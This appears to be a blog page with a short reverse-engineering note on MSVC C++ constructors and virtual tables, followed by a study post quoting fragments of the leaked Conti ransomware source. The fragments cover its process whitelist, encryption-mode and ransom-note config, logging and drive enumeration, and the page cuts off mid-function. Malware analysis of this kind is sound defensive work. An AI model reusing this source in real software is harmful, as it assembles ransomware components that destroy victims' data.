<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517125804861.png" alt="image-20220517125804861"></p>
<h2 id="x64-demo-code"><a href="#x64-demo-code" class="headerlink" title="x64 demo code"></a>x64 demo code</h2><p>成员函数CVirtual,析构函数CVirtual</p>
<p>虚函数 func1、func2</p>
<p>私有变量 m_nMember1、m_nMember2</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*--------------------------------------------</span></span><br><span class="line"><span class="comment">《加密与解密（第四版）》</span></span><br><span class="line"><span class="comment">(c)  看雪学院 www.kanxue.com 2000-2018</span></span><br><span class="line"><span class="comment">----------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Example4-1.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CVirtual</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">CVirtual</span>() &#123;</span><br><span class="line">		m_nMember1 = <span class="number">1</span>;</span><br><span class="line">		m_nMember2 = <span class="number">2</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CVirtual()\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">CVirtual</span>() &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;~CVirtual()\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fun1()\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fun2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fun2()\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_nMember1;</span><br><span class="line">	<span class="type">int</span> m_nMember2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">	CVirtual object;</span><br><span class="line">	object.<span class="built_in">fun1</span>();</span><br><span class="line">	object.<span class="built_in">fun2</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for循环用于初始化栈空间为0xCC</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517143459563.png" alt="image-20220517143459563"></p>
<h2 id="函数判断"><a href="#函数判断" class="headerlink" title="函数判断"></a>函数判断</h2><p>那么我们如何判断构造函数、析构函数？</p>
<p>main函数在申请了对象实例空间后的第一个函数调用即可猜测为类的构造函数，调用的最后一个函数可以猜测为析构函数</p>
<h3 id="构造函数实现"><a href="#构造函数实现" class="headerlink" title="构造函数实现"></a>构造函数实现</h3><p>首先初始化虚表指针，然后初始化数据乘员，构造函数完成，返回this指针。为什么需要返回this指针？c++编译器为了判断一个构造是否被调用而设置的。</p>
<p>如果一个函数在入口处使用<code>lea reg,off_xxxxxxxxx</code>和<code>mov [reg],reg</code>特征初始化虚表，且返回值为this指针，就可以怀疑这个函数是一个构造函数。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517145509769.png" alt="image-20220517145509769"></p>
<h3 id="析构函数实现"><a href="#析构函数实现" class="headerlink" title="析构函数实现"></a>析构函数实现</h3><p>首先初始化栈空间，然后赋值虚表，最后返回this指针。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517152232823.png" alt="image-20220517152232823"></p>
<blockquote>
<p>既然前面两个函数的流程都相同，那么如何判断构造函数和析构函数呢？</p>
<p>————在main函数中的调用顺序</p>
</blockquote>
<h2 id="虚表结构"><a href="#虚表结构" class="headerlink" title="虚表结构"></a>虚表结构</h2><p>因为这个类有虚函数，所以编译器为这个类产生了一个虚表，其存储在全局数据区（.rdata）.虚表的每一项都是8个字节，其中存储的是成员函数的地址。</p>
<blockquote>
<p>这里需要注意：因为虚表的最后一项不一定是以0结尾，所以虚表项的个数会根据其他信息来确定</p>
</blockquote>
<p>虚表汇总的函数按类中成员函数声明顺序依次放入。</p>
<blockquote>
<p>函数分布顺序在某些情况下不一定与声明顺序相同（例如虚函数重载），不过这个顺序对逆向还原代码没有影响。</p>
</blockquote>
<p>在该demo code中虽然只编写了一个析构函数，编译器却生成了两个析构函数。其中一个是普通析构函数，对象出作用域调用；另一个放在虚表里，在delete对象的时候调用。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517153516872.png" alt="image-20220517153516872"></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517153449968.png" alt="image-20220517153449968"></p>
<p>虚表中的析构函数比普通的析构函数多一个delete this操作。</p>
<p>delete 对象的时候，需要先调用析构函数，再释放对象的堆空间。</p>
<blockquote>
<p>object.~CVirtual()属于多态调用，所以会直接调用虚表里的析构函数，这个时候对象被释放。delete object这句代码优惠调用虚表里的析构函数，这样堆空间会重复释放。</p>
<p>那么为了解决这个问题，VC++编译器给析构函数增加了一个参数，pObject-&gt;~CVirtual()调用时参数传递0，这样对象就不会被释放。如果delete pObject的时候参数传递1，对象就会被释放。这样就解决了上面那个问题。</p>
<p>gcc则采用了虚表里放两个析构函数的方法解决该问题。</p>
</blockquote>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-05-19</span><i class="fa fa-tag"></i><a class="tag" href="/tags/c/" title="c++">c++ </a><span class="leancloud_visitors"></span><span>About 1338 words, 4 min 27 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/30/conti%20v3%20source%20code%20learning/">Conti v3 Ransomeware Souce Code Analysis</a></h3></div><div class="post-content"><div class="card"><p><h2 id="prockiller"><a href="#prockiller" class="headerlink" title="prockiller"></a>prockiller</h2><h3 id="prockiller-1"><a href="#prockiller-1" class="headerlink" title="prockiller"></a>prockiller</h3><h4 id="memorySnapshot"><a href="#memorySnapshot" class="headerlink" title="memorySnapshot"></a>memorySnapshot</h4><ul>
<li>pCreateToolhelp32Snapshot</li>
<li>pProcess32FirstW</li>
<li>pProcess32NextW</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;prockiller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../obfuscation/MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagPROCESSENTRY32W</span><br><span class="line">&#123;</span><br><span class="line"> DWORD   dwSize;</span><br><span class="line"> DWORD   cntUsage;</span><br><span class="line"> DWORD   th32ProcessID;          // this process</span><br><span class="line"> ULONG_PTR th32DefaultHeapID;</span><br><span class="line"> DWORD   th32ModuleID;           // associated exe</span><br><span class="line"> DWORD   cntThreads;</span><br><span class="line"> DWORD   th32ParentProcessID;    // this process&#x27;s parent process</span><br><span class="line"> LONG    pcPriClassBase;         // Base priority of process&#x27;s threads</span><br><span class="line"> DWORD   dwFlags;</span><br><span class="line"> WCHAR   szExeFile[MAX_PATH];    // Path</span><br><span class="line">&#125; PROCESSENTRY32W;</span><br></pre></td></tr></table></figure>

<p>szExeFile is the path the exe </p>
</blockquote>
<h4 id="Whitelist"><a href="#Whitelist" class="headerlink" title="Whitelist"></a>Whitelist</h4><p>add the process that is not explorer.exe to whitelist.So if the file is open, Ransomeware will not encrypt it.</p>
<blockquote>
<p>#define    TAILQ_INSERT_TAIL(head, elm, field) do {            <br>    TAILQ_NEXT((elm), field) &#x3D; NULL;                <br>    (elm)-&gt;field.tqe_prev &#x3D; (head)-&gt;tqh_last;            <br>    *(head)-&gt;tqh_last &#x3D; (elm);                    <br>    (head)-&gt;tqh_last &#x3D; &amp;TAILQ_NEXT((elm), field);            <br>} while (0)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;prockiller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../obfuscation/MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="global"><a href="#global" class="headerlink" title="global"></a>global</h2><p>set some global parameters,maybe used to build different character sample(extension,mutex…..)</p>
<ul>
<li>Extention</li>
<li>DecryptionNote</li>
<li>EncryptMode<ul>
<li>ALL_ENCRYPT 10</li>
<li>LOCAL_ENCRYPT 11</li>
<li>NETWORK_ENCRYPT 12</li>
<li>BACKUPS_ENCRYPT 13</li>
<li>PATH_ENCRYPT 14</li>
</ul>
</li>
<li>IsProcKillerEnabled</li>
<li>EncryptPath</li>
<li>EncryptSize</li>
<li>MutexName</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC WCHAR g_Extention[<span class="number">7</span>] = <span class="string">L&quot;.EXTEN&quot;</span>;</span><br><span class="line">STATIC CHAR g_DecryptNote[<span class="number">2048</span>] = <span class="string">&quot;__DECRYPT_NOTE__&quot;</span>;</span><br><span class="line">STATIC INT g_EncryptMode = ALL_ENCRYPT;</span><br><span class="line">STATIC BOOL g_IsProcKillerEnabled = FALSE;</span><br><span class="line">STATIC LPCWSTR g_EncryptPath = <span class="literal">NULL</span>;</span><br><span class="line">STATIC BYTE g_EncryptSize = <span class="number">50</span>;</span><br><span class="line"><span class="comment">//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;</span></span><br><span class="line"></span><br><span class="line">PWCHAR </span><br><span class="line"><span class="title function_">global::GetExtention</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_Extention;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR </span><br><span class="line"><span class="title function_">global::GetDecryptNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_DecryptNote;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR</span><br><span class="line"><span class="title function_">global::GetMutexName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//return g_MutexName;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetEncryptMode</span><span class="params">(INT EncryptMode)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptMode = EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INT</span><br><span class="line"><span class="title function_">global::GetEncryptMode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetProcKiller</span><span class="params">(BOOL IsEnabled)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_IsProcKillerEnabled = IsEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::GetProcKiller</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_IsProcKillerEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">global::SetEncryptPath</span><span class="params">(__in LPCWSTR Path)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptPath = Path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPCWSTR</span><br><span class="line"><span class="title function_">global::GetEncryptPath</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptPath;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::SetEncryptSize</span><span class="params">(__in INT Size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Size != <span class="number">10</span> ||</span><br><span class="line">		Size != <span class="number">15</span> ||</span><br><span class="line">		Size != <span class="number">20</span> ||</span><br><span class="line">		Size != <span class="number">25</span> ||</span><br><span class="line">		Size != <span class="number">30</span> ||</span><br><span class="line">		Size != <span class="number">35</span> ||</span><br><span class="line">		Size != <span class="number">40</span> ||</span><br><span class="line">		Size != <span class="number">45</span> ||</span><br><span class="line">		Size != <span class="number">50</span> ||</span><br><span class="line">		Size != <span class="number">60</span> ||</span><br><span class="line">		Size != <span class="number">70</span> ||</span><br><span class="line">		Size != <span class="number">80</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EncryptSize = <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><h3 id="logs-1"><a href="#logs-1" class="headerlink" title="logs"></a>logs</h3><ul>
<li>va_start</li>
<li>va_arg</li>
<li>va_end</li>
</ul>
<p>The <strong>RtlSecureZeroMemory</strong> routine fills a block of memory with zeros in a way that is guaranteed to be secure.</p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><blockquote>
<p>init in function main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(<span class="string">L&quot;-log&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (LogFile) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Init(LogFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs::Init(LPCWSTR LogFile)</span><br><span class="line">&#123;</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CritSec);</span><br><span class="line">	g_LogHandle = pCreateFileW(</span><br><span class="line">		LogFile,</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_ALWAYS,</span><br><span class="line">		FILE_FLAG_WRITE_THROUGH,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pSetFilePointer(g_LogHandle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>write some errors.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError());</span><br></pre></td></tr></table></figure>

<h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><h3 id="filesystem-1"><a href="#filesystem-1" class="headerlink" title="filesystem"></a>filesystem</h3><h4 id="disks"><a href="#disks" class="headerlink" title="disks"></a>disks</h4><ul>
<li>SIZE_T BufferLength &#x3D; (SIZE_T)pGetLogicalDriveStringsW(0, NULL); </li>
<li>pGetLogicalDriveStringsW(BufferLength, Buffer);</li>
</ul>
<blockquote>
<p>GetLogicalDriveStringsW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD GetLogicalDriveStringsW(</span><br><span class="line">[in]  DWORD  nBufferLength,</span><br><span class="line">[out] LPWSTR lpBuffer</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes.</p>
<p>If the buffer is not large enough, the return value is greater than <em>nBufferLength</em>. It is the size of the buffer required to hold the drive strings.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;filesystem.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../logs/logs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">INT </span><br><span class="line"><span class="title function_">filesystem::EnumirateDrives</span><span class="params">(__in PDRIVE_LIST DriveList)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Length = <span class="number">0</span>;</span><br><span class="line">	INT DrivesCount = <span class="number">0</span>;</span><br><span class="line">	DWORD DriveType = <span class="number">0</span>;</span><br><span class="line">	TAILQ_INIT(DriveList);</span><br><span class="line"></span><br><span class="line">	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!BufferLength) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + <span class="number">1</span>) * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="keyword">if</span> (!Buffer) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pGetLogicalDriveStringsW(BufferLength, Buffer);</span><br><span class="line">	</span><br><span class="line">	